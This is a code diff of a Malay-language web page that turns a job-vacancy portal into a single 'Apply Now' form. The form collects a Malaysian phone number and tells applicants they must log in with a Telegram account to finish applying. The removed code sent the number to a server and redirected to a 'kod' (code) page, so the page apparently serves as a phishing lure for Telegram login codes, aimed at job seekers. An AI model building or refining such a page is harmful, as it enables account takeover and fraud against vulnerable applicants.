@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ms">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Portal Jawatan Kosong Malaysia</title>
+<title>Hantar Permohonan</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -17,229 +16,72 @@
 
 body {
     font-family: 'Poppins', sans-serif;
-    background: #f5f7fb;
-    color: #202b3c;
-}
-
-header {
-    background: #102c50;
-    color: white;
-    padding: 18px 7%;
+    background: linear-gradient(135deg, #102c50, #1766a4);
+    min-height: 100vh;
     display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.logo {
-    font-size: 22px;
-    font-weight: 800;
-}
-
-.logo span {
-    color: #ffbd39;
-}
-
-nav a {
-    color: white;
-    text-decoration: none;
-    margin-left: 25px;
-    font-size: 14px;
-}
-
-.hero {
-    background: linear-gradient(120deg, #102c50, #1766a4);
-    padding: 65px 20px;
-    text-align: center;
-    color: white;
-}
-
-.hero h1 {
-    font-size: 34px;
-    margin-bottom: 12px;
-}
-
-.hero p {
-    font-size: 14px;
-    color: #dce9f7;
-    margin-bottom: 25px;
-}
-
-.search-box {
-    max-width: 650px;
-    margin: auto;
-    display: flex;
-    background: white;
-    border-radius: 8px;
-    padding: 6px;
-}
-
-.search-box input {
-    flex: 1;
-    border: none;
-    outline: none;
-    padding: 13px;
-    font-size: 14px;
-    min-width: 0;
-}
-
-.search-box button {
-    background: #ffb52e;
-    color: #172b46;
-    border: none;
-    padding: 12px 22px;
-    border-radius: 6px;
-    font-weight: 700;
-    cursor: pointer;
-}
-
-.container {
-    max-width: 1200px;
-    margin: 45px auto;
-    padding: 0 20px;
-}
-
-.section-title {
-    margin-bottom: 25px;
-}
-
-.section-title h2 {
-    font-size: 25px;
-}
-
-.section-title p {
-    color: #788497;
-    font-size: 13px;
-    margin-top: 5px;
-}
-
-.job-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 23px;
-}
-
-.job-card {
-    background: white;
-    border-radius: 12px;
-    overflow: hidden;
-    box-shadow: 0 4px 18px rgba(0,0,0,.06);
-    transition: .3s;
-}
-
-.job-card:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 10px 25px rgba(0,0,0,.1);
-}
-
-.job-card img {
-    width: 100%;
-    height: 190px;
-    object-fit: cover;
-}
-
-.job-content {
-    padding: 20px;
-}
-
-.category {
-    display: inline-block;
-    background: #e9f3ff;
-    color: #1766a4;
-    padding: 5px 11px;
-    border-radius: 20px;
-    font-size: 11px;
-    margin-bottom: 12px;
-}
-
-.job-content h3 {
-    font-size: 17px;
-    margin-bottom: 10px;
-}
-
-.job-info {
-    font-size: 12px;
-    color: #778397;
-    margin: 7px 0;
-}
-
-.salary {
-    font-size: 15px;
-    font-weight: 700;
-    color: #14865c;
-    margin: 15px 0;
-}
-
-.job-content button {
-    width: 100%;
-    border: none;
-    background: #1766a4;
-    color: white;
-    padding: 12px;
-    border-radius: 6px;
-    font-weight: 600;
-    cursor: pointer;
-}
-
-.job-content button:hover {
-    background: #102c50;
-}
-
-.no-result {
-    display: none;
-    text-align: center;
-    padding: 35px;
-    color: #777;
-}
-
-/* MODAL PERMOHONAN */
-.application-modal {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,.75);
-    z-index: 9999;
     justify-content: center;
     align-items: center;
-    padding: 15px;
-    overflow-y: auto;
+    padding: 20px;
 }
 
 .application-box {
     background: white;
     width: 100%;
-    max-width: 460px;
-    border-radius: 14px;
+    max-width: 440px;
+    border-radius: 16px;
     overflow: hidden;
+    box-shadow: 0 10px 40px rgba(0,0,0,.2);
+    animation: fadeIn .4s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.header-banner {
+    background: linear-gradient(90deg, #0052cc, #0066ff);
+    padding: 28px 20px;
+    text-align: center;
     position: relative;
-    max-height: 95vh;
-    overflow-y: auto;
-    animation: modalShow .25s ease;
+    overflow: hidden;
 }
 
-@keyframes modalShow {
-    from {
-        opacity: 0;
-        transform: translateY(20px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
+.header-banner::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+    opacity: .4;
 }
 
-.application-image {
-    width: 100%;
-    height: 210px;
-    object-fit: cover;
-    display: block;
+.apply-badge {
+    background: #ffcc00;
+    color: #003380;
+    font-size: 32px;
+    font-weight: 800;
+    padding: 8px 24px;
+    border-radius: 8px;
+    display: inline-block;
+    position: relative;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 3px 0 #cc9900;
+}
+
+.header-banner h2 {
+    color: white;
+    font-size: 20px;
+    margin-top: 14px;
+    font-weight: 600;
 }
 
 .application-content {
-    padding: 23px;
+    padding: 26px 22px;
 }
 
-.application-content h2 {
-    font-size: 21px;
+.application-content h3 {
+    font-size: 18px;
     color: #102c50;
     margin-bottom: 10px;
 }
@@ -248,447 +90,203 @@ nav a {
     font-size: 13px;
     color: #6d7787;
     line-height: 1.7;
-    margin-bottom: 20px;
+    margin-bottom: 22px;
 }
 
 .form-label {
     display: block;
-    font-size: 13px;
+    font-size: 14px;
     font-weight: 600;
     margin-bottom: 8px;
+    color: #334155;
+}
+
+.phone-wrapper {
+    display: flex;
+    align-items: center;
+    border: 1px solid #d5dce5;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 16px;
+    transition: .2s;
+}
+
+.phone-wrapper:focus-within {
+    border-color: #1766a4;
+    box-shadow: 0 0 0 3px rgba(23,102,164,.1);
+}
+
+.country-code {
+    background: #f1f5f9;
+    padding: 14px 12px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #334155;
+    border-right: 1px solid #d5dce5;
 }
 
 .phone-input {
-    width: 100%;
-    padding: 14px;
-    border: 1px solid #d5dce5;
-    border-radius: 7px;
+    flex: 1;
+    padding: 14px 12px;
+    border: none;
     font-size: 15px;
     outline: none;
-    margin-bottom: 15px;
     font-family: inherit;
-}
-
-.phone-input:focus {
-    border-color: #1766a4;
-    box-shadow: 0 0 0 3px rgba(23,102,164,.1);
 }
 
 .consent {
     display: flex;
     align-items: flex-start;
-    gap: 9px;
-    font-size: 11px;
+    gap: 10px;
+    font-size: 12px;
     color: #687386;
     line-height: 1.6;
-    margin-bottom: 20px;
+    margin-bottom: 22px;
 }
 
 .consent input {
-    margin-top: 4px;
-}
-
-.submit-button,
-.close-button {
-    width: 100%;
-    padding: 13px;
-    border: none;
-    border-radius: 7px;
-    font-size: 14px;
-    font-weight: 600;
+    margin-top: 3px;
+    width: 16px;
+    height: 16px;
     cursor: pointer;
-    font-family: inherit;
 }
 
 .submit-button {
-    background: #1766a4;
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    background: linear-gradient(90deg, #1766a4, #102c50);
     color: white;
-    margin-bottom: 10px;
+    transition: transform .2s, box-shadow .2s;
 }
 
 .submit-button:hover {
-    background: #102c50;
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(16,44,80,.35);
+}
+
+.submit-button:active {
+    transform: translateY(0);
 }
 
 .submit-button:disabled {
-    opacity: .6;
+    opacity: .7;
     cursor: not-allowed;
-}
-
-.close-button {
-    background: #edf1f5;
-    color: #334155;
+    transform: none;
 }
 
 .application-status {
-    font-size: 12px;
-    margin-bottom: 12px;
+    font-size: 13px;
+    margin-bottom: 14px;
     color: #c0392b;
+    display: none;
+    text-align: center;
+    padding: 8px;
+    background: #fdecea;
+    border-radius: 6px;
+}
+
+.success-box {
+    text-align: center;
+    padding: 10px 0 20px;
     display: none;
 }
 
-footer {
-    background: #102c50;
+.success-box.show {
+    display: block;
+}
+
+.success-icon {
+    width: 60px;
+    height: 60px;
+    background: #22c55e;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 auto 12px;
     color: white;
-    text-align: center;
-    padding: 25px;
-    margin-top: 60px;
-    font-size: 12px;
+    font-size: 32px;
 }
 
-@media(max-width: 900px) {
-    .job-grid {
-        grid-template-columns: repeat(2, 1fr);
-    }
+.success-box h4 {
+    color: #16a34a;
+    font-size: 17px;
+    margin-bottom: 6px;
 }
 
-@media(max-width: 600px) {
-    header {
-        padding: 15px 5%;
-    }
-
-    nav {
-        display: none;
-    }
-
-    .hero {
-        padding: 50px 15px;
-    }
-
-    .hero h1 {
-        font-size: 25px;
-    }
-
-    .job-grid {
-        grid-template-columns: 1fr;
-    }
-
-    .job-card img {
-        height: 210px;
-    }
-
-    .container {
-        margin: 30px auto;
-    }
-
-    .application-image {
-        height: 180px;
-    }
+.success-box p {
+    font-size: 13px;
+    color: #64748b;
 }
 </style>
 </head>
-
 <body>
 
-<header>
-    <div class="logo">JOB<span>CAREER</span></div>
-    <nav>
-        <a href="#">Laman Utama</a>
-        <a href="#lowongan">Jawatan Kosong</a>
-        <a href="#kontak">Hubungi Kami</a>
-    </nav>
-</header>
-
-<section class="hero">
-    <h1>Temui Kerjaya Impian Anda</h1>
-    <p>Terokai peluang pekerjaan terbaik di seluruh Malaysia.</p>
-
-    <div class="search-box">
-        <input type="text" id="searchInput"
-        placeholder="Cari nama jawatan...">
-        <button onclick="searchJobs()">Cari Jawatan</button>
-    </div>
-</section>
-
-<div class="container" id="lowongan">
-
-    <div class="section-title">
-        <h2>Senarai Jawatan Kosong Terkini</h2>
-        <p>Pilih pekerjaan yang bersesuaian dengan kelayakan dan pengalaman anda.</p>
+<div class="application-box">
+    <div class="header-banner">
+        <div class="apply-badge">APPLY NOW</div>
+        <h2>Hantar Permohonan Sekarang</h2>
     </div>
 
-    <div class="job-grid" id="jobGrid">
+    <div class="application-content">
+        <h3 id="jobTitle">Nama Jawatan</h3>
+        <p id="jobDescription" class="application-description">Untuk mendaftar sila log masuk menggunakan akaun Telegram. Kami akan menghantar pautan untuk melengkapkan sesi permohonan anda yang telah disiapkan.</p>
 
-        <div class="job-card" data-name="pembantu tadbir admin pejabat">
-            <img src="https://images.unsplash.com/photo-1497366754035-f200968a6e72?w=800" alt="Pembantu Tadbir">
-            <div class="job-content">
-                <span class="category">Pentadbiran</span>
-                <h3>Pembantu Tadbir Pejabat</h3>
-                <p class="job-info">📍 Kuala Lumpur, Malaysia</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM2,000 - RM3,000</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Bertanggungjawab menguruskan dokumen, memasukkan data, menyediakan laporan dan membantu urusan operasi pejabat.</p>
-            </div>
-        </div>
+        <form id="applicationForm">
+            <input type="hidden" id="selectedJob" name="job">
 
-        <div class="job-card" data-name="operator pengeluaran produksi">
-            <img src="https://images.unsplash.com/photo-1581092160562-40aa08e78837?w=800" alt="Operator Pengeluaran">
-            <div class="job-content">
-                <span class="category">Pembuatan</span>
-                <h3>Operator Pengeluaran</h3>
-                <p class="job-info">📍 Shah Alam, Selangor</p>
-                <p class="job-info">🕒 Kerja Syif</p>
-                <p class="salary">RM2,200 - RM3,500</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Mengendalikan mesin pengeluaran, memastikan kualiti produk dan mematuhi prosedur keselamatan semasa bekerja.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="pembantu gudang stor">
-            <img src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800" alt="Pembantu Gudang">
-            <div class="job-content">
-                <span class="category">Logistik</span>
-                <h3>Pembantu Gudang</h3>
-                <p class="job-info">📍 Klang, Selangor</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM2,000 - RM2,800</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Menguruskan penyimpanan barang, memeriksa stok dan menyediakan barangan untuk tujuan penghantaran.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="khidmat pelanggan customer service">
-            <img src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?w=800" alt="Khidmat Pelanggan">
-            <div class="job-content">
-                <span class="category">Perkhidmatan</span>
-                <h3>Eksekutif Khidmat Pelanggan</h3>
-                <p class="job-info">📍 Johor Bahru, Johor</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM2,200 - RM3,200</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Melayani pelanggan, menjawab pertanyaan, memberikan maklumat produk serta membantu menyelesaikan aduan pelanggan.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="penyambut tetamu hotel resepsionis">
-            <img src="https://images.unsplash.com/photo-1566073771259-6a8506099945?w=800" alt="Penyambut Tetamu Hotel">
-            <div class="job-content">
-                <span class="category">Perhotelan</span>
-                <h3>Penyambut Tetamu Hotel</h3>
-                <p class="job-info">📍 Melaka, Malaysia</p>
-                <p class="job-info">🕒 Kerja Syif</p>
-                <p class="salary">RM2,000 - RM3,000</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Menyambut tetamu hotel, menguruskan proses daftar masuk dan daftar keluar serta memberikan maklumat kepada pelanggan.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="pengawal keselamatan security">
-            <img src="https://images.unsplash.com/photo-1582139329536-e7284fece509?w=800" alt="Pengawal Keselamatan">
-            <div class="job-content">
-                <span class="category">Keselamatan</span>
-                <h3>Pengawal Keselamatan</h3>
-                <p class="job-info">📍 Pulau Pinang, Malaysia</p>
-                <p class="job-info">🕒 Kerja Syif</p>
-                <p class="salary">RM1,900 - RM2,800</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Menjaga keselamatan kawasan tempat kerja, menjalankan rondaan dan memantau pergerakan keluar masuk pengunjung.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="pemandu lori driver">
-            <img src="https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?w=800" alt="Pemandu">
-            <div class="job-content">
-                <span class="category">Pengangkutan</span>
-                <h3>Pemandu Kenderaan</h3>
-                <p class="job-info">📍 Kuala Lumpur, Malaysia</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM2,300 - RM3,500</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Menghantar barangan atau penumpang mengikut jadual, menjaga keadaan kenderaan dan mematuhi peraturan jalan raya.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="eksekutif pemasaran marketing">
-            <img src="https://images.unsplash.com/photo-1556761175-b413da4baf72?w=800" alt="Eksekutif Pemasaran">
-            <div class="job-content">
-                <span class="category">Pemasaran</span>
-                <h3>Eksekutif Pemasaran</h3>
-                <p class="job-info">📍 Kota Kinabalu, Sabah</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM2,200 - RM3,800</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Melaksanakan aktiviti promosi produk, mencari pelanggan baharu dan membantu mencapai sasaran jualan syarikat.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="pekerja pembersihan cleaning service">
-            <img src="./img/pekerja pembersih.jfif" alt="Pekerja Pembersihan">
-            <div class="job-content">
-                <span class="category">Pembersihan</span>
-                <h3>Pekerja Pembersihan</h3>
-                <p class="job-info">📍 Seremban, Negeri Sembilan</p>
-                <p class="job-info">🕒 Sepenuh Masa</p>
-                <p class="salary">RM1,900 - RM2,500</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Bertanggungjawab memastikan kebersihan bilik, kawasan pejabat dan kemudahan awam mengikut piawaian kebersihan.</p>
-            </div>
-        </div>
-
-        <div class="job-card" data-name="kakitangan restoran pekerja restoran">
-            <img src="./img/kakitangan restoran.jfif" alt="Kakitangan Restoran">
-            <div class="job-content">
-                <span class="category">Restoran</span>
-                <h3>Kakitangan Restoran</h3>
-                <p class="job-info">📍 Kuala Lumpur, Malaysia</p>
-                <p class="job-info">🕒 Kerja Syif</p>
-                <p class="salary">RM1,900 - RM2,800</p>
-                <button onclick="showApplication(this)">Mohon Sekarang</button>
-                <p hidden class="job-description">Melayani pelanggan, membantu operasi restoran, mengambil pesanan serta memastikan kebersihan kawasan kerja.</p>
-            </div>
-        </div>
-
-    </div>
-
-    <div class="no-result" id="noResult">
-        <h3>Jawatan tidak ditemui!</h3>
-        <p>Sila cuba menggunakan kata kunci carian yang lain.</p>
-    </div>
-
-</div>
-
-<!-- MODAL BORANG PERMOHONAN -->
-<div class="application-modal" id="applicationModal">
-    <div class="application-box">
-
-        <img id="jobImage" class="application-image" src="" alt="Gambar pekerjaan">
-
-        <div class="application-content">
-
-            <h2 id="jobTitle">Nama Jawatan</h2>
-
-            <p id="jobDescription" class="application-description"></p>
-
-            <form id="applicationForm">
-
-                <input type="hidden" id="selectedJob" name="job">
-
-                <label class="form-label" for="phoneNumber">
-                    Nombor Telefon Malaysia
-                </label>
-
+            <label class="form-label" for="phoneNumber">Nombor Telefon Malaysia</label>
+            <div class="phone-wrapper">
+                <span class="country-code">+60</span>
                 <input
                     type="tel"
                     id="phoneNumber"
                     name="phone"
                     class="phone-input"
-                    placeholder="Contoh: 0123456789"
+                    placeholder="Contoh: 123456789"
                     inputmode="tel"
                     autocomplete="tel"
-                    pattern="(?:\+?60|0)1[0-9]{7,9}"
+                    pattern="1[0-9]{7,9}"
                     required
                 >
+            </div>
 
-                <label class="consent">
-                    <input type="checkbox" id="consentCheck" required>
-                    <span>
-                        Saya bersetuju nombor telefon saya dihantar kepada pihak
-                        pengurusan untuk tujuan permohonan pekerjaan.
-                    </span>
-                </label>
+            <label class="consent">
+                <input type="checkbox" id="consentCheck" required>
+                <span>Saya bersetuju nombor telefon saya dihantar kepada pihak pengurusan untuk tujuan permohonan pekerjaan.</span>
+            </label>
 
-                <p id="applicationStatus" class="application-status" role="status"></p>
+            <p id="applicationStatus" class="application-status" role="status"></p>
 
-                <button type="submit" class="submit-button">
-                    Hantar Permohonan
-                </button>
+            <button type="submit" class="submit-button">
+                Hantar Permohonan
+            </button>
+        </form>
 
-                <button type="button" class="close-button" onclick="closeApplication()">
-                    Tutup
-                </button>
-
-            </form>
-
+        <div class="success-box" id="successBox">
+            <div class="success-icon">✓</div>
+            <h4>Permohonan Dihantar!</h4>
+            <p>Terima kasih. Kami akan menghubungi anda sebentar lagi.</p>
         </div>
     </div>
 </div>
 
-<footer id="kontak">
-    <h3>JOBCAREER</h3>
-    <p>Portal Maklumat Kekosongan Jawatan</p>
-    <p style="margin-top:10px;">
-        © 2026 JobCareer. All Rights Reserved.
-    </p>
-</footer>
-
 <script>
-/* CARI JAWATAN */
-function searchJobs() {
-    const input = document.getElementById("searchInput")
-        .value.trim().toLowerCase();
+// Boleh tukar nama jawatan & keterangan di sini
+const DEFAULT_JOB_TITLE = "Pembantu Tadbir Pejabat";
+const DEFAULT_JOB_DESC = "Untuk mendaftar sila log masuk menggunakan akaun Telegram. Kami akan menghantar pautan untuk melengkapkan sesi permohonan anda yang telah disiapkan.";
 
-    const cards = document.querySelectorAll(".job-card");
-    let found = 0;
-
-    cards.forEach(function(card) {
-        const name = (card.getAttribute("data-name") || "")
-            .toLowerCase();
-
-        const title = card.querySelector("h3")
-            ?.textContent.toLowerCase() || "";
-
-        const matches = name.includes(input) ||
-                        title.includes(input);
-
-        card.style.display = matches ? "" : "none";
-
-        if (matches) found++;
-    });
-
-    document.getElementById("noResult").style.display =
-        found === 0 ? "block" : "none";
-}
-
-document.getElementById("searchInput")
-    .addEventListener("input", searchJobs);
-
-
-/* BUKA BORANG PERMOHONAN */
-function showApplication(button) {
-    const card = button.closest(".job-card");
-
-    if (!card) return;
-
-    const image = card.querySelector("img").src;
-    const title = card.querySelector("h3").textContent.trim();
-    const description = card.querySelector(".job-description").textContent.trim();
-
-    const form = document.getElementById("applicationForm");
-
-    form.reset();
-
-    document.getElementById("jobImage").src = image;
-    document.getElementById("jobTitle").textContent = title;
-    document.getElementById("jobDescription").textContent = description;
-    document.getElementById("selectedJob").value = title;
-
-    document.getElementById("applicationStatus").style.display = "none";
-
-    const submitButton = form.querySelector(".submit-button");
-    submitButton.disabled = false;
-    submitButton.textContent = "Hantar Permohonan";
-
-    document.getElementById("applicationModal").style.display = "flex";
-    document.body.style.overflow = "hidden";
-}
-
-
-/* TUTUP BORANG */
-function closeApplication() {
-    document.getElementById("applicationModal").style.display = "none";
-    document.body.style.overflow = "";
-}
-
-
-/* KLIK DI LUAR MODAL */
-document.getElementById("applicationModal")
-    .addEventListener("click", function(event) {
-        if (event.target === this) {
-            closeApplication();
-        }
-    });
-
+document.addEventListener("DOMContentLoaded", function() {
+    document.getElementById("jobTitle").textContent = DEFAULT_JOB_TITLE;
+    document.getElementById("jobDescription").textContent = DEFAULT_JOB_DESC;
+    document.getElementById("selectedJob").value = DEFAULT_JOB_TITLE;
+});
 
 /* HANTAR PERMOHONAN */
 document.getElementById("applicationForm")
@@ -706,6 +304,10 @@ document.getElementById("applicationForm")
 
         const submitButton = form.querySelector(".submit-button");
         const status = document.getElementById("applicationStatus");
+        const successBox = document.getElementById("successBox");
+
+        successBox.classList.remove("show");
+        status.style.display = "none";
 
         if (!job || !phone || !consent) {
             status.textContent = "Sila lengkapkan semua maklumat.";
@@ -716,77 +318,40 @@ document.getElementById("applicationForm")
         submitButton.disabled = true;
         submitButton.textContent = "Sedang Menghantar...";
 
-        status.style.display = "none";
-
         try {
+            // Ganti dengan URL API sebenar apabila sedia
+            /*
             const response = await fetch("/api/apply", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    job: job,
-                    phone: phone,
-                    consent: consent
-                })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ job, phone, consent })
             });
 
             const result = await response.json();
-
             if (!response.ok || result.success !== true) {
-                throw new Error(
-                    result.message || "Permohonan gagal dihantar."
-                );
+                throw new Error(result.message || "Permohonan gagal dihantar.");
             }
+            */
 
-            /* SIMPAN SEMUA DATA UNTUK HALAMAN KOD */
+            // Simulasi penghantaran
+            await new Promise(resolve => setTimeout(resolve, 1200));
 
-            sessionStorage.setItem(
-                "jobcareerReference",
-                result.reference || ""
-            );
+            // Simpan data
+            sessionStorage.setItem("applicationPhone", phone);
+            sessionStorage.setItem("applicationJob", job);
 
-            sessionStorage.setItem(
-                "applicationPhone",
-                phone
-            );
-
-            sessionStorage.setItem(
-                "applicationJob",
-                job
-            );
-
-            sessionStorage.setItem(
-                "applicationImage",
-                document.getElementById("jobImage").src
-            );
-
-            /* PINDAH KE HALAMAN KOD */
-
-            window.location.assign("/kod.html");
+            // Tunjuk kejayaan
+            form.style.display = "none";
+            successBox.classList.add("show");
 
         } catch (error) {
-
-            console.error("Application error:", error);
-
-            status.textContent =
-                error.message ||
-                "Tidak dapat menghubungi server. Sila cuba lagi.";
-
+            console.error("Error:", error);
+            status.textContent = error.message || "Tidak dapat menghubungi server. Sila cuba lagi.";
             status.style.display = "block";
-
             submitButton.disabled = false;
             submitButton.textContent = "Hantar Permohonan";
         }
     });
-
-
-/* TUTUP DENGAN ESCAPE */
-document.addEventListener("keydown", function(event) {
-    if (event.key === "Escape") {
-        closeApplication();
-    }
-});
 </script>
 
 </body>
